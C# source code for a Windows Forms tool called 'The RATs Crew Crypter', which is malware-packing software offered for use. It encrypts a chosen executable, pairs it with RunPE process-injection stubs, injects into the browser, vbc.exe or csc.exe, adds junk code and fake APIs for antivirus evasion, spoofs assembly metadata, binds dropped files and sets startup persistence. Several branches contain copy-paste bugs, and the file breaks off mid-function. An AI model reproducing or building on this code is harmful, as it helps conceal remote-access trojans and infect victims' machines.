using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.CodeDom.Compiler;
using Microsoft.CSharp;
using System.Security.Cryptography;
using System.IO;
using System.Resources;
using System.IO.Compression;

namespace The_RATs_Crew_Crypter
{
    public partial class frmTRC_Crypter : Form
    {
        public frmTRC_Crypter()
        {
            InitializeComponent();
            grpMain.Visible = true;
            grpEncryptions.Visible = false;
            grpRunPEs.Visible = false;
            grpJunk.Visible = false;
            grpOptions.Visible = false;
            grpAssemblyChanger.Visible = false;

            grpEncryptions.Location = grpMain.Location;
            grpJunk.Location = grpMain.Location;
            grpOptions.Location = grpMain.Location;
            grpAssemblyChanger.Location = grpMain.Location;
            grpRunPEs.Location = grpMain.Location;

            this.Size = new Size(337, 463);
        }
        Random r = new Random();

        public static byte[] ReadEoF(string fileName)
        {
            byte[] buffer = null;
            using (FileStream fs = new FileStream(fileName, FileMode.Open))
            {
                buffer = new byte[4];
                fs.Position = 0x3C;
                fs.Read(buffer, 0, 4);
                fs.Position = BitConverter.ToInt32(buffer, 0) + 0x6;
                buffer = new byte[2];
                fs.Read(buffer, 0, 2);
                fs.Position += 0x100 + ((BitConverter.ToInt16(buffer, 0) - 1) * 0x28);
                buffer = new byte[8];
                fs.Read(buffer, 0, 8);
                fs.Position = BitConverter.ToInt32(buffer, 0) + BitConverter.ToInt32(buffer, 4);
                buffer = new byte[fs.Length - fs.Position];
                fs.Read(buffer, 0, buffer.Length);
            }
            return buffer;
        }
        public static void AppendEoF(string fileName, byte[] data)
        {
            using (FileStream fs = new FileStream(fileName, FileMode.Append, FileAccess.Write))
            {
                fs.Write(data, 0, data.Length);
            }
        }


        private void btnSelectBindFile2_Click(object sender, EventArgs e)
        {
            OpenFileDialog d = new OpenFileDialog();
            if (d.ShowDialog() == DialogResult.OK) txtBindFile2.Text = d.FileName;
        }
        private void btnSelectBindFile_Click(object sender, EventArgs e)
        {
            OpenFileDialog d = new OpenFileDialog();
            if (d.ShowDialog() == DialogResult.OK) txtBindFile.Text = d.FileName;
        }
        private void chkEnableAssemblyChanger_CheckedChanged(object sender, EventArgs e)
        {
            foreach (Control c in grpAssemblyChanger.Controls)
            {
                if (c != chkEnableAssemblyChanger) c.Enabled = !c.Enabled;
            }
        }
        private void btnEncryptedFileSearch_Click(object sender, EventArgs e)
        {
            OpenFileDialog d = new OpenFileDialog();
            if (d.ShowDialog() == DialogResult.OK) txtFile.Text = d.FileName;
        }
        private void btnSelectIcon_Click(object sender, EventArgs e)
        {
            OpenFileDialog d = new OpenFileDialog();
            d.Filter = "Icon (*.ico) |*.ico";
            if (d.ShowDialog() == DialogResult.OK) txtIcon.Text = d.FileName;
        }
        private void btnEncrypt_Click(object sender, EventArgs e)
        {
            #region "oo"
            CompilerParameters p = new CompilerParameters()
            {
                GenerateExecutable = true,
                TreatWarningsAsErrors = false,
                CompilerOptions = "/t:winexe",
                IncludeDebugInformation = false
            };
            if (txtIcon.Text != "") p.CompilerOptions += " /win32icon:\"" + txtIcon.Text + "\"";
            SaveFileDialog sfd = new SaveFileDialog();
            sfd.Filter = "Executable (*.exe) |*.exe";
            if (sfd.ShowDialog() == DialogResult.OK)
            {
                p.OutputAssembly = sfd.FileName;
                p.ReferencedAssemblies.Add("System.dll");

                string s = Properties.Resources.Source;

                byte[] b = File.ReadAllBytes(txtFile.Text);
                byte[] runPE = null;
                string EncryptionString = "";
                string EncryptionRunPE = "";

            #endregion

                #region "RunPEs"
                if (rdbRunPE0.Checked)
                {
                    runPE = Properties.Resources.RunPE0;
                    s = s.Replace("[TYPE-NUMBER]", "7");
                    s = s.Replace("[METHOD-NAME]", "MakeIt");
                }
                else if (rdbRunPE1.Checked)
                {
                    runPE = Properties.Resources.RunPE1;
                    s = s.Replace("[TYPE-NUMBER]", "0");
                    s = s.Replace("[METHOD-NAME]", "Run");
                }
                else if (rdbRunPE2.Checked)
                {
                    runPE = Properties.Resources.RunPE2;
                    s = s.Replace("[TYPE-NUMBER]", "5");
                    s = s.Replace("[METHOD-NAME]", "TmVQndIrQHbRoJsWMbhRh");
                }
                else if (rdbRunPE3.Checked)
                {
                    runPE = Properties.Resources.RunPE3;
                    s = s.Replace("[TYPE-NUMBER]", "0");
                    s = s.Replace("[METHOD-NAME]", "Run");
                }
                else if (rdbRunPE4.Checked)
                {
                    runPE = Properties.Resources.RunPE4;
                    s = s.Replace("[TYPE-NUMBER]", "0");
                    s = s.Replace("[METHOD-NAME]", "InjectPE");
                }
                else if (rdbRunPE5.Checked)
                {
                    runPE = Properties.Resources.RunPE5;
                    s = s.Replace("[TYPE-NUMBER]", "0");
                    s = s.Replace("[METHOD-NAME]", "SRexec");
                }
                else if (rdbRunPE6.Checked)
                {
                    runPE = Properties.Resources.RunPE6;
                    s = s.Replace("[TYPE-NUMBER]", "5");
                    s = s.Replace("[METHOD-NAME]", "RunPE");
                }
                else if (rdbRunPE7.Checked)
                {
                    runPE = Properties.Resources.RunPE7;
                    s = s.Replace("[TYPE-NUMBER]", "5");
                    s = s.Replace("[METHOD-NAME]", "SRexec");
                }
                else if (rdbRunPE8.Checked)
                {
                    runPE = Properties.Resources.RunPE8;
                    s = s.Replace("[TYPE-NUMBER]", "5");
                    s = s.Replace("[METHOD-NAME]", "Execute");
                }
                else if (rdbRunPE9.Checked)
                {
                    runPE = Properties.Resources.RunPE9;
                    s = s.Replace("[TYPE-NUMBER]", "0");
                    s = s.Replace("[METHOD-NAME]", "execute");
                }
                else if (rdbRunPE10.Checked)
                {
                    runPE = Properties.Resources.RunPE10;
                    s = s.Replace("[TYPE-NUMBER]", "5");
                    s = s.Replace("[METHOD-NAME]", "ZEKDtMulgFRIBCcYnhgKb");
                }
                else if (rdbRunPE11.Checked)
                {
                    runPE = Properties.Resources.RunPE11;
                    s = s.Replace("[TYPE-NUMBER]", "0");
                    s = s.Replace("[METHOD-NAME]", "Run");
                }
                #endregion

                #region "Encryption"

                if (rdbDES.Checked)
                {
                    EncryptionString = RndString(8);
                    EncryptionRunPE = RndString(8);
                    b = Encryption.DESEncrypt(b, EncryptionString);
                    runPE = Encryption.DESEncrypt(runPE, EncryptionRunPE);
                    s = s.Replace("[ENCRYPTION]", Properties.Resources.DESDecrypt);
                }
                else if (rdbRC2.Checked)
                {
                    EncryptionString = RndString(8);
                    EncryptionRunPE = RndString(8);
                    b = Encryption.RC2Encrypt(b, EncryptionString);
                    runPE = Encryption.RC2Encrypt(runPE, EncryptionRunPE);
                    s = s.Replace("[ENCRYPTION]", Properties.Resources.RC2Decrypt);
                }
                else if (rdbRC4.Checked)
                {
                    EncryptionString = RndString(16);
                    EncryptionRunPE = RndString(16);
                    b = Encryption.RC4EncryptDecrypt(b, EncryptionString);
                    runPE = Encryption.RC4EncryptDecrypt(runPE, EncryptionRunPE);
                    s = s.Replace("[ENCRYPTION]", Properties.Resources.RC4EncryptDecrypt);
                }
                else if (rdbRijndael.Checked)
                {
                    EncryptionString = RndString(16);
                    EncryptionRunPE = RndString(16);
                    b = Encryption.RijndaelEncrypt(b, EncryptionString);
                    runPE = Encryption.RijndaelEncrypt(runPE, EncryptionRunPE);
                    s = s.Replace("[ENCRYPTION]", Properties.Resources.RijndaelDecrypt);
                }
                else if (rdbSymentric.Checked)
                {
                    EncryptionString = RndString(16);
                    EncryptionRunPE = RndString(16);
                    b = Encryption.SymetricEncrypt(b, EncryptionString);
                    runPE = Encryption.SymetricEncrypt(runPE, EncryptionRunPE);
                    s = s.Replace("[ENCRYPTION]", Properties.Resources.SymentricDecrypt);
                }
                else if (rdbTripleDES.Checked)
                {
                    EncryptionString = RndString(24);
                    EncryptionRunPE = RndString(24);
                    b = Encryption.TripleDESEncrypt(b, EncryptionString);
                    runPE = Encryption.TripleDESEncrypt(runPE, EncryptionRunPE);
                    s = s.Replace("[ENCRYPTION]", Properties.Resources.TripleDESDecrypt);
                }
                else if (rdbXOR.Checked)
                {
                    EncryptionString = RndString(16);
                    EncryptionRunPE = RndString(16);
                    b = Encryption.XOREncryptDecrypt(b, EncryptionString);
                    runPE = Encryption.XOREncryptDecrypt(runPE, EncryptionRunPE);
                    s = s.Replace("[ENCRYPTION]", Properties.Resources.XOREncryptDecrypt);
                }
                else if (rdbPolyRev.Checked)
                {
                    EncryptionString = RndString(16);
                    EncryptionRunPE = RndString(16);
                    b = Encryption.PolyRevCrypt(b, EncryptionString);
                    runPE = Encryption.PolyRevCrypt(runPE, EncryptionRunPE);
                    s = s.Replace("[ENCRYPTION]", Properties.Resources.PolyRevDecrypt);
                }
                else if (rdbPolyStairs.Checked)
                {
                    EncryptionString = RndString(16);
                    EncryptionRunPE = RndString(16);
                    b = Encryption.PolyStairsCrypt(b, EncryptionString);
                    runPE = Encryption.PolyStairsCrypt(runPE, EncryptionRunPE);
                    s = s.Replace("[ENCRYPTION]", Properties.Resources.PolyStairsDecrypt);
                }
                else if (rdbAES.Checked)
                {
                    EncryptionString = RndString(16);
                    EncryptionRunPE = RndString(16);
                    b = Encryption.AESEncrypt(b, EncryptionString);
                    runPE = Encryption.AESEncrypt(runPE, EncryptionRunPE);
                    s = s.Replace("[ENCRYPTION]", Properties.Resources.AESDecrypt);
                }
                else if (rdbDex.Checked)
                {
                    EncryptionString = RndString(16);
                    EncryptionRunPE = RndString(16);
                    b = Encryption.DexEncrypt(b, EncryptionString);
                    runPE = Encryption.DexEncrypt(runPE, EncryptionRunPE);
                    s = s.Replace("[ENCRYPTION]", Properties.Resources.DexDecrypt);
                }
                else if (rdbPolyBaby.Checked)
                {
                    EncryptionString = RndString(16);
                    EncryptionRunPE = RndString(16);
                    b = Encryption.PolyBabyEncrypt(b, EncryptionString);
                    runPE = Encryption.PolyBabyEncrypt(runPE, EncryptionRunPE);
                    s = s.Replace("[ENCRYPTION]", Properties.Resources.PolyBabyDecrypt);
                }
                else if (rdbStairs.Checked)
                {
                    EncryptionString = RndString(16);
                    EncryptionRunPE = RndString(16);
                    b = Encryption.StairsEncrypt(b, EncryptionString);
                    runPE = Encryption.StairsEncrypt(runPE, EncryptionRunPE);
                    s = s.Replace("[ENCRYPTION]", Properties.Resources.StairsDecrypt);
                }
                else if (rdbCloud.Checked)
                {
                    EncryptionString = RndString(16);
                    EncryptionRunPE = RndString(16);
                    b = Encryption.CloudEncrypt(b, EncryptionString);
                    runPE = Encryption.CloudEncrypt(runPE, EncryptionRunPE);
                    s = s.Replace("[ENCRYPTION]", Properties.Resources.CloudDecrypt);
                }
                else if (rdbPolyCloud.Checked)
                {
                    EncryptionString = RndString(16);
                    EncryptionRunPE = RndString(16);
                    b = Encryption.PolyCloudEncrypt(b, EncryptionString);
                    runPE = Encryption.PolyCloudEncrypt(runPE, EncryptionRunPE);
                    s = s.Replace("[ENCRYPTION]", Properties.Resources.PolyCloudDecrypt);
                }
                else if (rdbPoly3DES.Checked)
                {
                    EncryptionString = RndString(24);
                    EncryptionRunPE = RndString(24);
                    b = Encryption.PolyTripleDESEncrypt(b, EncryptionString);
                    runPE = Encryption.PolyTripleDESEncrypt(b, EncryptionRunPE);
                    s = s.Replace("[ENCRYPTION]", Properties.Resources.PolyTripleDESDecrypt);
                }
                else if (rdbPoly3DES.Checked)
                {
                    EncryptionString = RndString(24);
                    EncryptionRunPE = RndString(24);
                    b = Encryption.PolyTripleDESEncrypt(b, EncryptionString);
                    runPE = Encryption.PolyTripleDESEncrypt(b, EncryptionRunPE);
                    s = s.Replace("[ENCRYPTION]", Properties.Resources.PolyTripleDESDecrypt);
                }
                else if (rdbPolyDES.Checked)
                {
                    EncryptionString = RndString(8);
                    EncryptionRunPE = RndString(8);
                    b = Encryption.PolyDESEncrypt(b, EncryptionString);
                    runPE = Encryption.PolyDESEncrypt(b, EncryptionRunPE);
                    s = s.Replace("[ENCRYPTION]", Properties.Resources.PolyDESDecrypt);
                }
                else if (rdbPolySymentric.Checked)
                {
                    EncryptionString = RndString(16);
                    EncryptionRunPE = RndString(16);
                    b = Encryption.PolySymetricEncrypt(b, EncryptionString);
                    runPE = Encryption.PolySymetricEncrypt(b, EncryptionRunPE);
                    s = s.Replace("[ENCRYPTION]", Properties.Resources.PolySymentricDecrypt);
                }
                else if (rdbPolyRC2.Checked)
                {
                    EncryptionString = RndString(8);
                    EncryptionRunPE = RndString(8);
                    b = Encryption.PolyRC2Encrypt(b, EncryptionString);
                    runPE = Encryption.PolyRC2Encrypt(b, EncryptionRunPE);
                    s = s.Replace("[ENCRYPTION]", Properties.Resources.PolyRC2Decrypt);
                }
                else if (rdbPolyDEX.Checked)
                {
                    EncryptionString = RndString(16);
                    EncryptionRunPE = RndString(16);
                    b = Encryption.PolyDexEncrypt(b, EncryptionString);
                    runPE = Encryption.PolyDexEncrypt(b, EncryptionRunPE);
                    s = s.Replace("[ENCRYPTION]", Properties.Resources.PolyDexDecrypt);
                }
                else if (rdbPolyAES.Checked)
                {
                    EncryptionString = RndString(32);
                    EncryptionRunPE = RndString(32);
                    b = Encryption.PolyAESEncrypt(b, EncryptionString);
                    runPE = Encryption.PolyAESEncrypt(b, EncryptionRunPE);
                    s = s.Replace("[ENCRYPTION]", Properties.Resources.PolyAESDecrypt);
                }


                #region "Compression"

                if (chkCompressGZip.Checked)
                {
                    s = s.Replace("[COMPRESSION-FUNCTION]", Properties.Resources.CompressionDecompress);
                    s = s.Replace("[COMPRESSION]", "henk = Decompress(henk);");
                    b = Encryption.CompressionCompress(b);
                }
                else
                {
                    s = s.Replace("[COMPRESSION-FUNCTION]", "");
                    s = s.Replace("[COMPRESSION]", "");
                }

                #endregion

                #endregion

                #region "Assembly Changer"

                if (chkEnableAssemblyChanger.Checked)
                {
                    string asm = Properties.Resources.AssemblyChanger;
                    asm = asm.Replace("[TITLE]", txtASMTitle.Text);
                    asm = asm.Replace("[DESCRIPTION]", txtASMDescription.Text);
                    asm = asm.Replace("[COPYRIGHT]", txtASMCopyright.Text);
                    asm = asm.Replace("[VERSION]", string.Format("{0}.{1}.{2}.{3}", 
                        numASM1.Value, numASM2.Value, numASM3.Value, numASM4.Value));
                    asm = asm.Replace("[FILE-VERSION]", string.Format("{0}.{1}.{2}.{3}", 
                        numASMF1.Value, numASMF2.Value, numASMF3.Value, numASMF4.Value));
                    asm = asm.Replace("[COMPANY]", txtASMCompany.Text);
                    asm = asm.Replace("[PRODUCT]", txtASMProduct.Text);
                    s = s.Replace("[ASSEMBLY-CHANGER]", asm);
                }
                else s = s.Replace("[ASSEMBLY-CHANGER]", "");

                #endregion

                #region "Junk Generator"

                if (chkJunkCode.Checked)
                {
                    string junk = Junk.GenerateJunk((int)numHowManyJunk.Value, chkUseArrays.Checked, (int)numJunkLength.Value, chkVagueVarsJunk.Checked);
                    s = s.Replace("[JUNK-CODE]", "private static void lawldd(){\r\n" + junk + "\r\n}");
                }
                else s = s.Replace("[JUNK-CODE]", "");

                if (chkFakeAPIs.Checked)
                {
                    s = s.Replace("[FAKE-API]", Junk.GenerateAPIs((int)numHowManyAPIs.Value, (int)numAPILength.Value, chkUseArraysAPI.Checked, chkVagueVarsAPI.Checked));
                }
                else s = s.Replace("[FAKE-API]", "");

                #endregion

                #region "Install"

                string InstallPath = "";
                if (rdbInstallAppData.Checked)
                {
                    InstallPath = Properties.Resources.InstallFile.Replace("[INSTALL-PATH]",
                        "Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)");
                }
                else if (rdbInstallTemp.Checked)
                {
                    InstallPath = Properties.Resources.InstallFile.Replace("[INSTALL-PATH]", 
                        "Environment.GetEnvironmentVariable(\"TEMP\")");
                }
                s = s.Replace("[INSTALL]", InstallPath);

                #endregion

                #region "Compiling"

                ResourceWriter w = new ResourceWriter(Application.StartupPath + "\\shank.resources");
                w.AddResource("cheese", b);
                w.AddResource("runPE", runPE);

                if (!string.IsNullOrEmpty(txtBindFile.Text))
                {
                    w.AddResource("candy", System.IO.File.ReadAllBytes(txtBindFile.Text));
                    string dropper = Properties.Resources.Dropper;
                    string Filenam3 = txtBindFile.Text.Substring(txtBindFile.Text.LastIndexOf('\\') + 1);
                    dropper = dropper.Replace("[FILENAME]", Filenam3);
                    s = s.Replace("[DROPPER]", dropper);
                }
                else s = s.Replace("[DROPPER]", "");

                if (!string.IsNullOrEmpty(txtBindFile2.Text))
                {
                    w.AddResource("bri", System.IO.File.ReadAllBytes(txtBindFile2.Text));
                    string dropper = Properties.Resources.Dropper2;
                    string Filenam3 = txtBindFile2.Text.Substring(txtBindFile2.Text.LastIndexOf('\\') + 1);
                    dropper = dropper.Replace("[FILENAME]", Filenam3);
                    s = s.Replace("[DROPPER2]", dropper);
                }
                else s = s.Replace("[DROPPER2]", "");

                w.Close();
                p.EmbeddedResources.Add(Application.StartupPath + "\\shank.resources");

                s = s.Replace("{KEY}", EncryptionString);
                s = s.Replace("{RUNPEKEY}", EncryptionRunPE);


                #region "Injection Path"
                if (rdbDefaultBrowser.Checked)
                {
                    s = s.Replace("[INJECT-INTO]", "DefaultBrowser()");
                    s = s.Replace("[DEFAULT-BROWSER]", Properties.Resources.DefaultBrowser);
                }
                else if (rdbInjectInto.Checked)
                {
                    s = s.Replace("[INJECT-INTO]", "\"" + txtInjectInto.Text + "\"");
                    s = s.Replace("[DEFAULT-BROWSER]", "");
                }
                else if (rdbVBC.Checked)
                {
                    s = s.Replace("[INJECT-INTO]", "vbc()");
                    s = s.Replace("[DEFAULT-BROWSER]", Properties.Resources.VBC);
                }
                else if (rdbCSC.Checked)
                {
                    s = s.Replace("[INJECT-INTO]", "csc()");
                    s = s.Replace("[DEFAULT-BROWSER]", Properties.Resources.VBC.Replace("vbc()", "csc()").Replace("vbc.exe", "csc.exe"));
                }
                #endregion

                #region "Startup"
                if (chkStartup.Checked)
                {
                    s = s.Replace("[STARTUP]", Properties.Resources.Startup.Replace("[KEYNAME]", txtKeynameStartup.Text));
                }
                else
                {
                    s = s.Replace("[STARTUP]", "");
                }
                #endregion

                CompilerResults r = new CSharpCodeProvider().CompileAssemblyFromSource(p, s);

                File.Delete(Application.StartupPath + "\\shank.resources");

                if (r.Errors.Count > 0) MessageBox.Show("There went something wrong! Contact CaptainBri for help."); //foreach (CompilerError er in r.Errors) MessageBox.Show(er.ToString());
                else
                {
                    if (chkPreserveEoF.Checked) AppendEoF(sfd.FileName, ReadEoF(sfd.FileName));
                    MessageBox.Show("Succesfully crypted! RATs Crew forever ^^");
                }

                //System.IO.File.WriteAllText("disaster.txt", s);

                #endregion
            }
        }
        private string RndString(int HowMany)
        {
            string all = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM";
            string returnme = "";
            for (int i = 0; i < HowMany; i++) returnme += all[r.Next(0, all.Length)];
            return returnme;
        }

        private void txtIcon_DragEnter(object sender, DragEventArgs e)
        {
            if (e.Data.GetDataPresent(DataFormats.FileDrop)) e.Effect = DragDropEffects.Copy;
        }
        private void txtIcon_DragDrop(object sender, DragEventArgs e)
        {
            try
            {
                Array a = (Array)e.Data.GetData(DataFormats.FileDrop);
                if (a.GetValue(0).ToString().EndsWith(".ico")) txtIcon.Text = a.GetValue(0).ToString();
            }
            catch { }
        }

        private void btnRunPEs_Click(object sender, EventArgs e)
        {
            HideAllButMe(grpRunPEs);
        }
        private void btnEncryption_Click(object sender, EventArgs e)
        {
            HideAllButMe(grpEncryptions);
        }
        private void btnUSG_Click(object sender, EventArgs e)
        {
            HideAllButMe(grpJunk);
        }
        private void btnOptions_Click(object sender, EventArgs e)
        {
            HideAllButMe(grpOptions);
        }
        private void btnAssemblyChanger_Click(object sender, EventArgs e)
        {
            HideAllButMe(grpAssemblyChanger);
        }
        private void btnMain_Click(object sender, EventArgs e)
        {
            HideAllButMe(grpMain);
        }

        private void HideAllButMe(GroupBox gbox)
        {
            if (gbox != grpEncryptions) grpEncryptions.Visible = false;
            if (gbox != grpJunk) grpJunk.Visible = false;
            if (gbox != grpOptions) grpOptions.Visible = false;
            if (gbox != grpRunPEs) grpRunPEs.Visible = false;
            if (gbox != grpAssemblyChanger) grpAssemblyChanger.Visible = false;
            if (gbox != grpMain) grpMain.Visible = false;
            gbox.Visible = true;
        }

        private void FileBinderDr0p(object sender, DragEventArgs e)
        {
            (sender as TextBox).Text = ((Array)e.Data.GetData(DataFormats.FileDrop)).GetValue(0).ToString();
        }
        private void FileBinderEnt3r(object sender, DragEventArgs e)
        {
            if (e.Data.GetDataPresent(DataFormats.FileDrop)) e.Effect = DragDropEffects.Copy;
        }

        private void CheckedChang3d(object sender, EventArgs e)
        {
            foreach (Control c in (sender as CheckBox).Parent.Controls)
            {
                if (c != chkJunkCode && c != chkFakeAPIs) c.Enabled = !c.Enabled;
            }
        }

        private void btnInjection_Click(object sender, EventArgs e)
        {

        }
    }

    public class Encryption
    {
        public static byte[] DESEncrypt(byte[] bytes, string Key)
        {
            byte[] inputArray = bytes;
            DESCryptoServiceProvider DES = new DESCryptoServiceProvider();
            DES.Key = UTF8Encoding.UTF8.GetBytes(Key);
            DES.Mode = CipherMode.ECB;
            DES.Padding = PaddingMode.PKCS7;
            ICryptoTransform cTransform = DES.CreateEncryptor();
            byte[] resultArray = cTransform.TransformFinalBlock(inputArray, 0, inputArray.Length);
            DES.Clear();
            return resultArray;
        }
        public static byte[] TripleDESEncrypt(byte[] bytes, string Key)
        {
            byte[] inputArray = bytes;
            TripleDESCryptoServiceProvider tripleDES = new TripleDESCryptoServiceProvider();
            tripleDES.Key = UTF8Encoding.UTF8.GetBytes(Key);
            tripleDES.Mode = CipherMode.ECB;
            tripleDES.Padding = PaddingMode.PKCS7;
            ICryptoTransform cTransform = tripleDES.CreateEncryptor();
            byte[] resultArray = cTransform.TransformFinalBlock(inputArray, 0, inputArray.Length);
            tripleDES.Clear();
            return resultArray;
        }
        public static byte[] RijndaelEncrypt(byte[] bytes, string Key)
        {
            MemoryStream memoryStream;
            CryptoStream cryptoStream;
            Rijndael rijndael = Rijndael.Create();
            Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(Key,
            new byte[] { 0x26, 0xdc, 0xff, 0x00, 0xad, 0xed, 0x7a, 0xee, 0xc5, 0xfe, 0x07, 0xaf, 0x4d, 0x08, 0x22, 0x3c });
            rijndael.Key = pdb.GetBytes(32);
            rijndael.IV = pdb.GetBytes(16);
            memoryStream = new MemoryStream();
            cryptoStream = new CryptoStream(memoryStream, rijndael.CreateEncryptor(), CryptoStreamMode.Write);
            cryptoStream.Write(bytes, 0, bytes.Length);
            cryptoStream.Close();
            return memoryStream.ToArray();
        }
        public static byte[] RC4EncryptDecrypt(byte[] bytes, string Key)
        {
            byte[] key = System.Text.Encoding.ASCII.GetBytes(Key);
            byte[] s = new byte[256];
            byte[] k = new byte[256];
            byte temp;
            int i, j;

            for (i = 0; i < 256; i++)
            {
                s[i] = (byte)i;
                k[i] = key[i % key.GetLength(0)];
            }

            j = 0;
            for (i = 0; i < 256; i++)
            {
                j = (j + s[i] + k[i]) % 256;
                temp = s[i];
                s[i] = s[j];
                s[j] = temp;
            }

            i = j = 0;
            for (int x = 0; x < bytes.GetLength(0); x++)
            {
                i = (i + 1) % 256;
                j = (j + s[i]) % 256;
                temp = s[i];
                s[i] = s[j];
                s[j] = temp;
                int t = (s[i] + s[j]) % 256;
                bytes[x] ^= s[t];
            }
            return bytes;
        }
        public static byte[] XOREncryptDecrypt(byte[] bytes, string Key)
        {
            int amount = 350;
            byte[] key = System.Text.Encoding.ASCII.GetBytes(Key);
            for (int i = 0; i < bytes.Length; i++) bytes[i] ^= (byte)(key[i % key.Length] >> (i + amount + key.Length) & 255);
            return bytes;
        }
        public static byte[] SymetricEncrypt(byte[] bytes, string Key)
        {
            SymmetricAlgorithm rijn = SymmetricAlgorithm.Create();
            MemoryStream ms = new MemoryStream();
            byte[] key = Encoding.ASCII.GetBytes(Key);
            byte[] rgbIV = key;
            CryptoStream cs = new CryptoStream(ms, rijn.CreateEncryptor(key, rgbIV), CryptoStreamMode.Write);
            cs.Write(bytes, 0, bytes.Length);
            cs.Close();
            return ms.ToArray();
        }
        public static byte[] RC2Encrypt(byte[] bytes, string Key)
        {
            byte[] byteKey = Encoding.ASCII.GetBytes(Key);
            byte[] byteIV = byteKey;
            MemoryStream MS = new MemoryStream();
            RC2CryptoServiceProvider CryptoMethod = new RC2CryptoServiceProvider();
            CryptoStream CS = new CryptoStream(MS, CryptoMethod.CreateEncryptor(byteKey, byteIV), CryptoStreamMode.Write);
            CS.Write(bytes, 0, bytes.Length);
            CS.FlushFinalBlock();
            return MS.ToArray();
        }

        public static byte[] PolyRevCrypt(byte[] data, string pass)
        {
            byte rndByte = (byte)new Random().Next(1, 255);
            byte[] passByte = System.Text.Encoding.ASCII.GetBytes(pass);
            byte[] Out = new byte[data.Length + 1];
            int u = 0;
            for (int i = 0; i <= data.Length - 1; i++)
            {
                Out[i] = (byte)((data[i] ^ passByte[u]) ^ rndByte);
                Array.Reverse(passByte);
                if (u == passByte.Length - 1) u = 0;
                else u += 1;
            }
            Array.Resize(ref Out, Out.Length);
            Out[Out.Length - 1] = rndByte;
            Array.Reverse(Out);
            return Out;
        }
        public static byte[] PolyStairsCrypt(byte[] Data, string key)
        {
            byte[] Key = System.Text.Encoding.ASCII.GetBytes(key);
            Array.Resize(ref Data, Data.Length + 1);
            Data[Data.Length - 1] = (byte)new Random().Next(1, 255);
            for (int i = Data.Length; i >= 0; i += -1)
            {
                Data[i % Data.Length] = (byte)(byte)(((int)((Data[i % Data.Length]) + (int)(Data[(i + 1) % Data.Length])) % 256) ^ Key[i % Key.Length]);
            }
            return Data;
        }
        public static byte[] DexEncrypt(byte[] plain, string Key)
        {
            byte[] key = System.Text.Encoding.ASCII.GetBytes(Key);
            for (int round = 0; round < 5; round++)
            {
                for (int i = 0; i < plain.Length; i++)
                {
                    plain[i] = (byte)(plain[i] ^ key[i % key.Length]);
                    for (int k = 0; k < key.Length; k++) plain[i] = (byte)(plain[i] ^ ((((key[k] << round) ^ k) + i)));
                }
            }
            return plain;
        }
        public static byte[] PolyBabyEncrypt(byte[] input, string Key)
        {
            byte[] key = System.Text.Encoding.ASCII.GetBytes(Key);
            byte[] Out = new byte[input.Length + 1];
            int x = new Random().Next(1, 255);
            for (int i = 0; i <= input.Length - 1; i++) Out[i] = (byte)(input[i] ^ (key[i % key.Length] + x) & 255);
            Out[input.Length] = (byte)x;
            return Out;
        }
        public static byte[] AESEncrypt(byte[] input, string Pass)
        {
            System.Security.Cryptography.RijndaelManaged AES = new System.Security.Cryptography.RijndaelManaged();
            byte[] hash = new byte[32];
            byte[] temp = new MD5CryptoServiceProvider().ComputeHash(System.Text.Encoding.ASCII.GetBytes(Pass));
            Array.Copy(temp, 0, hash, 0, 16);
            Array.Copy(temp, 0, hash, 15, 16);
            AES.Key = hash;
            AES.Mode = System.Security.Cryptography.CipherMode.ECB;
            System.Security.Cryptography.ICryptoTransform DESEncrypter = AES.CreateEncryptor();
            return DESEncrypter.TransformFinalBlock(input, 0, input.Length);
        }
        public static byte[] CloudEncrypt(byte[] Input, string key)
        {
            byte[] Key = System.Text.Encoding.ASCII.GetBytes(key);
            byte[] FinVal = new byte[Input.Length];
            short kc = 0;
            for (int index = 0; index < Input.Length; index++)
            {
                if (kc >= Key.Length) kc = 0;
                FinVal[index] = (byte)(Input[index] + (Input.Length % Key.Length) + (Key[kc]));
                kc++;
            }
            return FinVal;
        }
        public static byte[] StairsEncrypt(byte[] Data, string Key)
        {
            byte[] key = System.Text.Encoding.ASCII.GetBytes(Key);
            for (int i = 0; i <= (Data.Length * 2) + key.Length; i++)
            {
                Data[i % Data.Length] = (byte)((byte)((int)((Data[i % Data.Length]) + (int)(Data[(i + 1) % Data.Length])) % 256) ^ key[i % key.Length]);
            }
            return Data;
        }
        public static byte[] PolyCloudEncrypt(byte[] Input, string key)
        {
            byte[] Key = System.Text.Encoding.ASCII.GetBytes(key);
            Random Rnd = new Random();
            int Salt = Rnd.Next(1, 50);
            byte[] FinVal = new byte[Input.Length + 1];
            FinVal[Input.Length] = (byte)Salt;
            short kc = 0;
            for (int index = 0; index < Input.Length; index++)
            {
                if (kc >= Key.Length) kc = 0;
                FinVal[index] = (byte)(Input[index] + (Input.Length % Key.Length) + (Key[kc]) - Salt);
                kc++;
            }
            return FinVal;
        }

        public static byte[] PolyTripleDESEncrypt(byte[] bytes, string Key)
        {
            byte[] inputArray = bytes;
            Array.Resize(ref inputArray, inputArray.Length + 1);
            inputArray[inputArray.Length - 1] = (byte)new Random().Next(0, 255);
            TripleDESCryptoServiceProvider tripleDES = new TripleDESCryptoServiceProvider();
            tripleDES.Key = UTF8Encoding.UTF8.GetBytes(Key);
            tripleDES.Mode = CipherMode.ECB;
            tripleDES.Padding = PaddingMode.PKCS7;
            ICryptoTransform cTransform = tripleDES.CreateEncryptor();
            byte[] resultArray = cTransform.TransformFinalBlock(inputArray, 0, inputArray.Length);
            tripleDES.Clear();
            return resultArray;
        }
        public static byte[] PolyDESEncrypt(byte[] bytes, string Key)
        {
            byte[] inputArray = bytes;
            Array.Resize(ref inputArray, inputArray.Length + 1);
            inputArray[inputArray.Length - 1] = (byte)new Random().Next(0, 255);
            DESCryptoServiceProvider DES = new DESCryptoServiceProvider();
            DES.Key = UTF8Encoding.UTF8.GetBytes(Key);
            DES.Mode = CipherMode.ECB;
            DES.Padding = PaddingMode.PKCS7;
            ICryptoTransform cTransform = DES.CreateEncryptor();
            byte[] resultArray = cTransform.TransformFinalBlock(inputArray, 0, inputArray.Length);
            DES.Clear();
            return resultArray;
        }
        public static byte[] PolySymetricEncrypt(byte[] bytes, string Key)
        {
            Array.Resize(ref bytes, bytes.Length + 1);
            bytes[bytes.Length - 1] = (byte)new Random().Next(0, 255);
